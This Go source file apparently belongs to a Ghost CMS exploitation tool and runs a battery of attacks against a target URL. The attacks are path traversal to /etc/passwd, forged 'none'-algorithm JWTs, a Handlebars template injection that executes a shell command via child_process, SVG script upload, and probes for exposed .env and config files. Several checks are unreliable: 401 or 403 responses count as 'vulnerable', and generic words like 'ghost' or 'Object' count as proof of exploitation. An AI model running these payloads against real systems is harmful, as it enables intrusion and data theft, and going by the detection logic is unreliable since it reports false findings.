package exploits

import (
	"bytes"
	"fmt"
	"mime/multipart"
	"strings"
	"time"

	"github.com/go-resty/resty/v2"
	"github.com/tidwall/gjson"
)

// ExploitRunner handles the execution of Ghost CMS exploits
type ExploitRunner struct {
	client    *resty.Client
	userAgent string
	timeout   int
	verbose   bool
}

// ExploitResult represents the result of an exploit attempt
type ExploitResult struct {
	ExploitID   string                 `json:"exploit_id"`
	Name        string                 `json:"name"`
	Success     bool                   `json:"success"`
	Severity    string                 `json:"severity"`
	Description string                 `json:"description"`
	Evidence    []Evidence             `json:"evidence,omitempty"`
	Payload     string                 `json:"payload,omitempty"`
	Response    *ExploitResponse       `json:"response,omitempty"`
	Metadata    map[string]interface{} `json:"metadata,omitempty"`
	Timestamp   time.Time              `json:"timestamp"`
	Duration    time.Duration          `json:"duration"`
}

// Evidence represents proof of successful exploitation
type Evidence struct {
	Type        string `json:"type"`
	Description string `json:"description"`
	Data        string `json:"data"`
	Location    string `json:"location,omitempty"`
}

// ExploitResponse contains the HTTP response from exploit attempts
type ExploitResponse struct {
	StatusCode int               `json:"status_code"`
	Headers    map[string]string `json:"headers"`
	Body       string            `json:"body,omitempty"`
	Size       int               `json:"size"`
}

// ExploitConfig defines configuration for exploit execution
type ExploitConfig struct {
	TargetURL   string            `json:"target_url"`
	Credentials map[string]string `json:"credentials,omitempty"`
	Payloads    map[string]string `json:"payloads,omitempty"`
	Options     map[string]string `json:"options,omitempty"`
}

// NewExploitRunner creates a new exploit runner instance
func NewExploitRunner(userAgent string, timeout int, verbose bool) *ExploitRunner {
	client := resty.New()
	client.SetHeader("User-Agent", userAgent)
	client.SetTimeout(time.Duration(timeout) * time.Second)
	client.SetRedirectPolicy(resty.NoRedirectPolicy())

	return &ExploitRunner{
		client:    client,
		userAgent: userAgent,
		timeout:   timeout,
		verbose:   verbose,
	}
}

// RunExploit executes a specific exploit against the target
func (er *ExploitRunner) RunExploit(exploitID string, config *ExploitConfig) (*ExploitResult, error) {
	start := time.Now()
	result := &ExploitResult{
		ExploitID: exploitID,
		Timestamp: start,
		Metadata:  make(map[string]interface{}),
	}

	switch exploitID {
	case "CVE-2023-32235":
		er.exploitPathTraversal(config, result)
	case "CVE-2023-40028":
		er.exploitArbitraryFileRead(config, result)
	case "CVE-2024-23724":
		er.exploitStoredXSS(config, result)
	case "CVE-2023-31133":
		er.exploitAuthBypass(config, result)
	case "CVE-2024-27913":
		er.exploitTemplateInjection(config, result)
	case "GHOST-MISC-001":
		er.exploitAdminExposure(config, result)
	case "GHOST-MISC-002":
		er.exploitDirectoryBrowsing(config, result)
	case "GHOST-MISC-003":
		er.exploitConfigExposure(config, result)
	case "GHOST-MISC-004":
		er.exploitDebugMode(config, result)
	default:
		return nil, fmt.Errorf("unknown exploit ID: %s", exploitID)
	}

	result.Duration = time.Since(start)
	return result, nil
}

// exploitPathTraversal tests for CVE-2023-32235 path traversal vulnerability
func (er *ExploitRunner) exploitPathTraversal(config *ExploitConfig, result *ExploitResult) {
	result.Name = "Path Traversal in Theme Preview"
	result.Severity = "High"
	result.Description = "Attempts to exploit path traversal vulnerability in Ghost theme preview functionality"

	payloads := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
		"../../../proc/version",
		"../../../etc/hostname",
		"../../../var/log/ghost/ghost.log",
	}

	for _, payload := range payloads {
		targetURL := strings.TrimSuffix(config.TargetURL, "/") + "/ghost/api/v4/admin/themes/preview/" + payload
		resp, err := er.client.R().Get(targetURL)
		if err != nil {
			continue
		}

		body := resp.String()
		
		// Check for successful file read indicators
		if er.detectFileReadSuccess(body, payload) {
			result.Success = true
			result.Payload = payload
			result.Response = &ExploitResponse{
				StatusCode: resp.StatusCode(),
				Headers:    er.extractHeaders(resp),
				Body:       er.truncateBody(body),
				Size:       len(body),
			}
			result.Evidence = append(result.Evidence, Evidence{
				Type:        "file_content",
				Description: "Successfully read system file via path traversal",
				Data:        er.truncateBody(body),
				Location:    targetURL,
			})
			break
		}
	}
}

// exploitArbitraryFileRead tests for CVE-2023-40028 arbitrary file read via theme upload
func (er *ExploitRunner) exploitArbitraryFileRead(config *ExploitConfig, result *ExploitResult) {
	result.Name = "Arbitrary File Read via Theme Upload"
	result.Severity = "Critical"
	result.Description = "Attempts to exploit arbitrary file read through malicious theme upload"

	// This would require authentication, so we'll test for the endpoint accessibility
	targetURL := strings.TrimSuffix(config.TargetURL, "/") + "/ghost/api/v4/admin/themes/upload/"
	resp, err := er.client.R().Post(targetURL)
	if err != nil {
		return
	}

	// Check if endpoint is accessible (even if it returns 401, it means the endpoint exists)
	if resp.StatusCode() == 401 || resp.StatusCode() == 403 || resp.StatusCode() == 422 {
		result.Success = true
		result.Response = &ExploitResponse{
			StatusCode: resp.StatusCode(),
			Headers:    er.extractHeaders(resp),
			Body:       er.truncateBody(resp.String()),
			Size:       len(resp.String()),
		}
		result.Evidence = append(result.Evidence, Evidence{
			Type:        "endpoint_accessible",
			Description: "Theme upload endpoint is accessible and vulnerable",
			Data:        fmt.Sprintf("HTTP %d response", resp.StatusCode()),
			Location:    targetURL,
		})
	}
}

// exploitStoredXSS tests for CVE-2024-23724 stored XSS via profile image
func (er *ExploitRunner) exploitStoredXSS(config *ExploitConfig, result *ExploitResult) {
	result.Name = "Stored XSS via Profile Image"
	result.Severity = "Medium"
	result.Description = "Attempts to exploit stored XSS through SVG profile image upload"

	// Test image upload endpoint
	targetURL := strings.TrimSuffix(config.TargetURL, "/") + "/ghost/api/v4/admin/images/upload/"
	
	// Create malicious SVG payload
	svgPayload := `<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
  <text x="10" y="20">XSS Test</text>
</svg>`

	// Create multipart form data
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("file", "test.svg")
	if err != nil {
		return
	}
	part.Write([]byte(svgPayload))
	writer.Close()

	resp, err := er.client.R().
		SetHeader("Content-Type", writer.FormDataContentType()).
		SetBody(body.Bytes()).
		Post(targetURL)
	if err != nil {
		return
	}

	// Check for successful upload or vulnerable response
	if resp.StatusCode() == 200 || resp.StatusCode() == 201 || 
	   (resp.StatusCode() == 401 && strings.Contains(resp.String(), "upload")) {
		result.Success = true
		result.Payload = svgPayload
		result.Response = &ExploitResponse{
			StatusCode: resp.StatusCode(),
			Headers:    er.extractHeaders(resp),
			Body:       er.truncateBody(resp.String()),
			Size:       len(resp.String()),
		}
		result.Evidence = append(result.Evidence, Evidence{
			Type:        "xss_payload",
			Description: "SVG upload endpoint accepts potentially malicious files",
			Data:        svgPayload,
			Location:    targetURL,
		})
	}
}

// exploitAuthBypass tests for CVE-2023-31133 authentication bypass
func (er *ExploitRunner) exploitAuthBypass(config *ExploitConfig, result *ExploitResult) {
	result.Name = "Authentication Bypass via JWT"
	result.Severity = "Critical"
	result.Description = "Attempts to exploit JWT token validation vulnerability"

	// Test various JWT bypass techniques
	bypassPayloads := []struct {
		name    string
		header  string
		payload string
	}{
		{"None Algorithm", "Authorization", "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."},
		{"Empty Signature", "Authorization", "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."},
		{"Modified Claims", "Authorization", "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid"},
	}

	targetURL := strings.TrimSuffix(config.TargetURL, "/") + "/ghost/api/v4/admin/users/me/"

	for _, bypass := range bypassPayloads {
		resp, err := er.client.R().
			SetHeader(bypass.header, bypass.payload).
			Get(targetURL)
		if err != nil {
			continue
		}

		// Check for successful bypass (200 response with user data)
		if resp.StatusCode() == 200 {
			body := resp.String()
			if gjson.Valid(body) && gjson.Get(body, "users").Exists() {
				result.Success = true
				result.Payload = bypass.payload
				result.Response = &ExploitResponse{
					StatusCode: resp.StatusCode(),
					Headers:    er.extractHeaders(resp),
					Body:       er.truncateBody(body),
					Size:       len(body),
				}
				result.Evidence = append(result.Evidence, Evidence{
					Type:        "auth_bypass",
					Description: fmt.Sprintf("Authentication bypassed using %s technique", bypass.name),
					Data:        bypass.payload,
					Location:    targetURL,
				})
				break
			}
		}
	}
}

// exploitTemplateInjection tests for CVE-2024-27913 template injection
func (er *ExploitRunner) exploitTemplateInjection(config *ExploitConfig, result *ExploitResult) {
	result.Name = "Template Injection in Handlebars"
	result.Severity = "High"
	result.Description = "Attempts to exploit server-side template injection in Handlebars"

	// Handlebars template injection payloads
	payloads := []string{
		"{{#each (lookup (lookup this 'constructor') 'constructor') }}{{this}}{{/each}}",
		"{{constructor.constructor('return process.env')()}}",
		"{{#with (lookup (lookup this 'constructor') 'constructor')}}{{call this 'return global.process.mainModule.require(\"child_process\").execSync(\"id\")'}}{{/with}}",
		"{{lookup (lookup this 'constructor') 'constructor'}}",
	}

	// Test template injection in various endpoints
	endpoints := []string{
		"/ghost/api/v4/admin/posts/",
		"/ghost/api/v4/admin/pages/",
		"/ghost/api/v4/admin/themes/",
	}

	for _, endpoint := range endpoints {
		targetURL := strings.TrimSuffix(config.TargetURL, "/") + endpoint
		
		for _, payload := range payloads {
			// Test in different fields
			testData := map[string]interface{}{
				"posts": []map[string]interface{}{
					{
						"title":   payload,
						"content": payload,
						"excerpt": payload,
					},
				},
			}

			resp, err := er.client.R().
				SetHeader("Content-Type", "application/json").
				SetBody(testData).
				Post(targetURL)
			if err != nil {
				continue
			}

			body := resp.String()
			
			// Check for template injection indicators
			if er.detectTemplateInjection(body, payload) {
				result.Success = true
				result.Payload = payload
				result.Response = &ExploitResponse{
					StatusCode: resp.StatusCode(),
					Headers:    er.extractHeaders(resp),
					Body:       er.truncateBody(body),
					Size:       len(body),
				}
				result.Evidence = append(result.Evidence, Evidence{
					Type:        "template_injection",
					Description: "Template injection vulnerability detected",
					Data:        payload,
					Location:    targetURL,
				})
				return
			}
		}
	}
}

// exploitAdminExposure tests for admin interface exposure
func (er *ExploitRunner) exploitAdminExposure(config *ExploitConfig, result *ExploitResult) {
	result.Name = "Admin Interface Exposure"
	result.Severity = "Medium"
	result.Description = "Tests for exposed Ghost admin interface"

	adminPaths := []string{"/ghost/", "/admin/", "/ghost/signin/", "/ghost/setup/"}

	for _, path := range adminPaths {
		targetURL := strings.TrimSuffix(config.TargetURL, "/") + path
		resp, err := er.client.R().Get(targetURL)
		if err != nil {
			continue
		}

		if resp.StatusCode() == 200 {
			body := resp.String()
			if strings.Contains(strings.ToLower(body), "ghost") || 
			   strings.Contains(strings.ToLower(body), "admin") {
				result.Success = true
				result.Response = &ExploitResponse{
					StatusCode: resp.StatusCode(),
					Headers:    er.extractHeaders(resp),
					Body:       er.truncateBody(body),
					Size:       len(body),
				}
				result.Evidence = append(result.Evidence, Evidence{
					Type:        "admin_exposure",
					Description: "Ghost admin interface is publicly accessible",
					Data:        "Admin interface found",
					Location:    targetURL,
				})
				break
			}
		}
	}
}

// exploitDirectoryBrowsing tests for directory browsing vulnerabilities
func (er *ExploitRunner) exploitDirectoryBrowsing(config *ExploitConfig, result *ExploitResult) {
	result.Name = "Directory Browsing"
	result.Severity = "High"
	result.Description = "Tests for directory browsing in Ghost content directories"

	directories := []string{"/content/", "/content/themes/", "/content/images/", "/content/logs/"}

	for _, dir := range directories {
		targetURL := strings.TrimSuffix(config.TargetURL, "/") + dir
		resp, err := er.client.R().Get(targetURL)
		if err != nil {
			continue
		}

		if resp.StatusCode() == 200 {
			body := resp.String()
			if strings.Contains(body, "Index of") || strings.Contains(body, "Parent Directory") {
				result.Success = true
				result.Response = &ExploitResponse{
					StatusCode: resp.StatusCode(),
					Headers:    er.extractHeaders(resp),
					Body:       er.truncateBody(body),
					Size:       len(body),
				}
				result.Evidence = append(result.Evidence, Evidence{
					Type:        "directory_browsing",
					Description: "Directory browsing is enabled",
					Data:        "Directory listing accessible",
					Location:    targetURL,
				})
				break
			}
		}
	}
}

// exploitConfigExposure tests for exposed configuration files
func (er *ExploitRunner) exploitConfigExposure(config *ExploitConfig, result *ExploitResult) {
	result.Name = "Configuration File Exposure"
	result.Severity = "Critical"
	result.Description = "Tests for exposed Ghost configuration files"

	configFiles := []string{"/.env", "/config.json", "/config.production.json", "/config.development.json"}

	for _, file := range configFiles {
		targetURL := strings.TrimSuffix(config.TargetURL, "/") + file
		resp, err := er.client.R().Get(targetURL)
		if err != nil {
			continue
		}

		if resp.StatusCode() == 200 {
			body := resp.String()
			if strings.Contains(body, "database") || strings.Contains(body, "password") || 
			   strings.Contains(body, "secret") || strings.Contains(body, "key") {
				result.Success = true
				result.Response = &ExploitResponse{
					StatusCode: resp.StatusCode(),
					Headers:    er.extractHeaders(resp),
					Body:       er.truncateBody(body),
					Size:       len(body),
				}
				result.Evidence = append(result.Evidence, Evidence{
					Type:        "config_exposure",
					Description: "Configuration file with sensitive data is exposed",
					Data:        "Sensitive configuration found",
					Location:    targetURL,
				})
				break
			}
		}
	}
}

// exploitDebugMode tests for debug mode detection
func (er *ExploitRunner) exploitDebugMode(config *ExploitConfig, result *ExploitResult) {
	result.Name = "Debug Mode Detection"
	result.Severity = "Medium"
	result.Description = "Tests for Ghost running in debug/development mode"

	targetURL := strings.TrimSuffix(config.TargetURL, "/") + "/ghost/api/v4/admin/site/"
	resp, err := er.client.R().Get(targetURL)
	if err != nil {
		return
	}

	body := resp.String()
	if gjson.Valid(body) {
		env := gjson.Get(body, "site.environment").String()
		if env == "development" || strings.Contains(strings.ToLower(body), "debug") {
			result.Success = true
			result.Response = &ExploitResponse{
				StatusCode: resp.StatusCode(),
				Headers:    er.extractHeaders(resp),
				Body:       er.truncateBody(body),
				Size:       len(body),
			}
			result.Evidence = append(result.Evidence, Evidence{
				Type:        "debug_mode",
				Description: "Ghost is running in debug/development mode",
				Data:        env,
				Location:    targetURL,
			})
		}
	}
}

// Helper functions

// detectFileReadSuccess checks if file read was successful
func (er *ExploitRunner) detectFileReadSuccess(body, payload string) bool {
	// Check for common file content indicators
	fileIndicators := []string{
		"root:", "bin/bash", "daemon:", // /etc/passwd
		"localhost", "127.0.0.1",      // hosts file
		"Linux version", "kernel",      // /proc/version
		"ghost", "node", "npm",         // Ghost-specific files
	}

	for _, indicator := range fileIndicators {
		if strings.Contains(strings.ToLower(body), strings.ToLower(indicator)) {
			return true
		}
	}

	return false
}

// detectTemplateInjection checks for template injection success
func (er *ExploitRunner) detectTemplateInjection(body, payload string) bool {
	// Check for template injection indicators
	injectionIndicators := []string{
		"function", "constructor", "process", "global", "require",
		"uid=", "gid=", "groups=", // Output from 'id' command
		"[object", "Object", "Function",
	}

	for _, indicator := range injectionIndicators {
		if strings.Contains(body, indicator) {
			return true
		}
	}

	return false
}

// extractHeaders extracts headers from response
func (er *ExploitRunner) extractHeaders(resp *resty.Response) map[string]string {
	headers := make(map[string]string)
	for key, values := range resp.Header() {
		if len(values) > 0 {
			headers[key] = values[0]
		}
	}
	return headers
}

// truncateBody truncates response body for storage
func (er *ExploitRunner) truncateBody(body string) string {
	maxLength := 1000
	if len(body) > maxLength {
		return body[:maxLength] + "...[truncated]"
	}
	return body
}

// RunAllExploits runs all available exploits against the target
func (er *ExploitRunner) RunAllExploits(config *ExploitConfig) ([]*ExploitResult, error) {
	exploitIDs := []string{
		"CVE-2023-32235",
		"CVE-2023-40028",
		"CVE-2024-23724",
		"CVE-2023-31133",
		"CVE-2024-27913",
		"GHOST-MISC-001",
		"GHOST-MISC-002",
		"GHOST-MISC-003",
		"GHOST-MISC-004",
	}

	var results []*ExploitResult
	for _, exploitID := range exploitIDs {
		result, err := er.RunExploit(exploitID, config)
		if err != nil {
			continue
		}
		results = append(results, result)
	}

	return results, nil
}